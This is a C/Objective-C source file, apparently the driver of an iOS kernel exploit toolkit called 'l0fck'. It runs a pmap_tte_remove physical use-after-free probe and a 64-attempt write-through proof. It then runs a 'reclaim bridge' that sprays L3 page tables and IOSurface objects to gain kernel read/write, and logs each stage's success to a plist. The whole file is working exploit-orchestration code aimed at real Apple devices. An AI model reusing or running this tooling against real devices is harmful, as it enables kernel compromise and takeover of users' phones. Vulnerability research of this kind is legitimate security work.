/*
 * pmap_payload — On-device pmap_tte-remove PUAF + SPTM reclaim bridge
 *
 * Modes:
 *   check    Quick PUAF probe (1 attempt)
 *   prove    Full 64/64 write-through proof
 *   reclaim  SPTM reclaim bridge (L3 spray + IOSurface)
 *   full     prove then reclaim
 */

#import <Foundation/Foundation.h>
#include <TargetConditionals.h>
#if TARGET_OS_IPHONE
#import <UIKit/UIKit.h>
#endif
#include "pmap_core.h"
#include "../../include/exploits/pmap_result.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <errno.h>
#include <getopt.h>

static const char *result_path(void)
{
    const char *env = getenv("L0FCK_RESULT_PATH");
    if (env && env[0]) {
        return env;
    }
#if TARGET_OS_IPHONE
    return L0FCK_DEVICE_PMAP_RESULT;
#else
    return "/tmp/pmap_result.plist";
#endif
}

static int ensure_result_dir(const char *path)
{
    char dir[512];
    snprintf(dir, sizeof(dir), "%s", path);
    char *slash = strrchr(dir, '/');
    if (!slash) {
        return 0;
    }
    *slash = '\0';
    if (dir[0] == '\0') {
        return 0;
    }

    char partial[512];
    partial[0] = '\0';
    const char *p = dir;
    if (*p == '/') {
        snprintf(partial, sizeof(partial), "/");
        p++;
    }

    while (*p) {
        const char *next = strchr(p, '/');
        size_t seg_len = next ? (size_t)(next - p) : strlen(p);
        if (seg_len > 0) {
            size_t cur_len = strlen(partial);
            if (cur_len > 0 && partial[cur_len - 1] != '/') {
                strlcat(partial, "/", sizeof(partial));
            }
            strncat(partial, p, seg_len);
            mkdir(partial, 0755);
        }
        if (!next) {
            break;
        }
        p = next + 1;
    }
    return 0;
}

static void write_result_plist(const char *phase, const pmap_prove_result_t *r, const char *error_msg)
{
    struct utsname u;
    uname(&u);

    const char *path = result_path();
    ensure_result_dir(path);

    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    dict[@(PMAP_KEY_VERSION)] = @(PMAP_RESULT_VERSION);
    dict[@(PMAP_KEY_PHASE)] = [NSString stringWithUTF8String:phase];
    dict[@(PMAP_KEY_OVERFLOW_OK)] = @(r ? r->overflow_ok : 0);
    dict[@(PMAP_KEY_MAPPINGS_CREATED)] = @(r ? r->mappings_created : 0);
    dict[@(PMAP_KEY_DANGLING_PTES)] = @(r ? r->dangling_ptes : 0);
    dict[@(PMAP_KEY_KERNEL_READS)] = @(r ? r->kernel_reads : 0);
    dict[@(PMAP_KEY_WRITE_CONFIRMED)] = @(r ? r->write_confirmed : 0);
    dict[@(PMAP_KEY_PROVE_ATTEMPTS)] = @(r ? r->prove_attempts : 0);
    dict[@(PMAP_KEY_PUAF_READY)] = @(r ? r->puaf_ready : 0);
    dict[@(PMAP_KEY_KRW_READY)] = @(r ? r->krw_ready : 0);
    dict[@(PMAP_KEY_RECLAIM_READY)] = @(r ? r->reclaim_ready : 0);
    dict[@(PMAP_KEY_OBJECT_CORRUPT)] = @(r ? r->object_corrupt_ready : 0);
    dict[@(PMAP_KEY_L3_FAULTS)] = @(r ? r->l3_faults : 0);
    dict[@(PMAP_KEY_L3_CHANGED)] = @(r ? r->l3_changed : 0);
    dict[@(PMAP_KEY_IOSURFACE_HITS)] = @(r ? r->iosurface_hits : 0);
    dict[@(PMAP_KEY_SPRAY_COUNT)] = @(r ? r->spray_count : 0);
    dict[@(PMAP_KEY_RETRY_ATTEMPTS)] = @(r ? r->retry_attempts : 0);
    dict[@(PMAP_KEY_ELAPSED_MS)] = @(r ? (unsigned long long)r->elapsed_ms : 0);
    dict[@(PMAP_KEY_MACHINE)] = [NSString stringWithUTF8String:u.machine];
    dict[@(PMAP_KEY_PID)] = @((int)getpid());

    if (r && r->reclaim_strategy[0]) {
        dict[@(PMAP_KEY_RECLAIM_STRATEGY)] = [NSString stringWithUTF8String:r->reclaim_strategy];
    }

#if TARGET_OS_IPHONE
    dict[@(PMAP_KEY_IOS_VERSION)] = [[UIDevice currentDevice] systemVersion];
#else
    dict[@(PMAP_KEY_IOS_VERSION)] = @"macos-lab";
#endif

    if (r && r->verdict[0]) {
        dict[@(PMAP_KEY_VERDICT)] = [NSString stringWithUTF8String:r->verdict];
    }
    if (error_msg && error_msg[0]) {
        dict[@(PMAP_KEY_ERROR)] = [NSString stringWithUTF8String:error_msg];
    }

    NSString *nspath = [NSString stringWithUTF8String:path];
    if (![dict writeToFile:nspath atomically:YES]) {
        fprintf(stderr, "[-] Failed to write result plist: %s (%s)\n", path, strerror(errno));
    } else {
        printf("[+] Result written: %s\n", path);
    }
}

static void usage(const char *prog)
{
    printf("Usage: %s <mode> [options]\n\n", prog);
    printf("Modes:\n");
    printf("  check    Quick PUAF probe (1 attempt)\n");
    printf("  prove    Full 64/64 pmap_tte_remove proof\n");
    printf("  reclaim  SPTM reclaim bridge (L3 32MB spray + IOSurface)\n");
    printf("  full     prove + reclaim\n");
    printf("\nOptions:\n");
    printf("  --spray N    Spray count (default 1024)\n");
    printf("  --retry N    Max reclaim retries (default 5)\n");
    printf("  --l3-only    L3 pmap spray only\n");
    printf("  --ios-only   IOSurface spray only\n");
}

int main(int argc, char *argv[])
{
    @autoreleasepool {
        if (argc < 2) {
            usage(argv[0]);
            return 1;
        }

        const char *mode = argv[1];
        int nprove = 64;
        int spray_count = 1024;
        int max_retries = 5;
        int try_l3 = 1;
        int try_ios = 1;

        static struct option long_opts[] = {
            { "spray", required_argument, NULL, 's' },
            { "retry", required_argument, NULL, 'r' },
            { "l3-only", no_argument, NULL, 'l' },
            { "ios-only", no_argument, NULL, 'i' },
            { "help", no_argument, NULL, 'h' },
            { NULL, 0, NULL, 0 }
        };

        optind = 2;
        int opt;
        while ((opt = getopt_long(argc, argv, "s:r:lih", long_opts, NULL)) != -1) {
            switch (opt) {
            case 's': spray_count = atoi(optarg); break;
            case 'r': max_retries = atoi(optarg); break;
            case 'l': try_l3 = 1; try_ios = 0; break;
            case 'i': try_l3 = 0; try_ios = 1; break;
            case 'h': usage(argv[0]); return 0;
            default: usage(argv[0]); return 1;
            }
        }

        bool do_check = (strcmp(mode, "check") == 0);
        bool do_prove = (strcmp(mode, "prove") == 0);
        bool do_reclaim = (strcmp(mode, "reclaim") == 0);
        bool do_full = (strcmp(mode, "full") == 0);

        if (!do_check && !do_prove && !do_reclaim && !do_full) {
            fprintf(stderr, "[-] Unknown mode: %s\n", mode);
            usage(argv[0]);
            return 1;
        }

        if (do_check) {
            nprove = 1;
        }

        printf("=== l0fck pmap-tte-remove + SPTM Reclaim Bridge ===\n");
        printf("  mode=%s pid=%d spray=%d retry=%d\n\n", mode, getpid(), spray_count, max_retries);

        pmap_prove_result_t result;
        memset(&result, 0, sizeof(result));

        if (do_check || do_prove || do_full) {
            int confirmed = pmap_run_prove(do_check ? 1 : 64, &result);
            if (confirmed < 0) {
                fprintf(stderr, "[-] pmap_run_prove failed: %s\n", result.error);
                write_result_plist(mode, &result, result.error);
                return 1;
            }
            printf("PUAF: %d/%d write-through, %d kernel PTE reads\n",
                   result.write_confirmed, result.prove_attempts, result.kernel_reads);
        }

        if (do_reclaim || do_full) {
            pmap_reclaim_config_t cfg;
            memset(&cfg, 0, sizeof(cfg));
            cfg.spray_count = spray_count;
            cfg.max_retries = max_retries;
            cfg.try_l3_spray = try_l3;
            cfg.try_iosurface = try_ios;

            printf("\n[*] Running SPTM reclaim bridge...\n");
            int reclaim_rc = pmap_run_reclaim(&cfg, &result);
            printf("RECLAIM: strategy=%s l3_faults=%d l3_changed=%d iosurface_hits=%d\n",
                   result.reclaim_strategy, result.l3_faults, result.l3_changed, result.iosurface_hits);
            printf("VERDICT: %s\n\n", result.verdict);

            if (!do_full && reclaim_rc <= 0 && !result.reclaim_ready) {
                write_result_plist("reclaim", &result, NULL);
                return 1;
            }
        }

        const char *phase = do_reclaim ? "reclaim" : (do_full ? "full" : mode);
        write_result_plist(phase, &result, NULL);

        if (result.krw_ready) {
            return 0;
        }
        if (result.reclaim_ready) {
            return 0;
        }
        return result.puaf_ready ? 0 : 1;
    }
}
